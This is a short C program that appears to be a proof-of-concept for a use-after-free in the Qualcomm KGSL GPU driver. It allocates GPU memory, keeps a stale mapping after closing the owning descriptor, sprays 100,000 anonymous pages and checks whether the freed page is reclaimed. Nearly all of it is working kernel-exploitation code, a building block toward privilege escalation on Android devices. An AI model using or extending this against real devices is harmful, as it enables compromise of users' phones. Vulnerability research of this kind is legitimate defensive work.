#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>

#define IOCTL_GPUMEM_ALLOC 0xc018092f

struct gpumem_alloc_req {
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
};

int main() {
    int fd1 = open("/dev/kgsl-3d0", O_RDWR);
    struct gpumem_alloc_req req = {0};
    req.size = 0x1000;
    ioctl(fd1, IOCTL_GPUMEM_ALLOC, &req);
    
    int fd2 = open("/dev/kgsl-3d0", O_RDWR);
    uint64_t *ptr2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd2, req.gpuaddr);
    
    ptr2[0] = 0x1122334455667788ULL;
    close(fd1);

    // Try to spray MOVABLE pages (user-space anonymous memory is MOVABLE!)
    printf("[*] Spraying user-space anonymous pages (MOVABLE)...\n");
    uint64_t **spray_ptrs = malloc(100000 * sizeof(uint64_t*));
    for (int i = 0; i < 100000; i++) {
        spray_ptrs[i] = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (spray_ptrs[i] != MAP_FAILED) {
            spray_ptrs[i][0] = 0xDEADBEEF00000000ULL + i;
        }
    }

    if (ptr2[0] >= 0xDEADBEEF00000000ULL && ptr2[0] < 0xDEADBEEF00000000ULL + 100000) {
        printf("[+] CONFIRMED: Page was reclaimed by user-space MOVABLE memory!\n");
        printf("    This proves KGSL memory is in the CMA or ZONE_MOVABLE region.\n");
    } else {
        printf("[-] NOT reclaimed by user-space page. Value remains: 0x%016lx\n", ptr2[0]);
    }
    
    return 0;
}
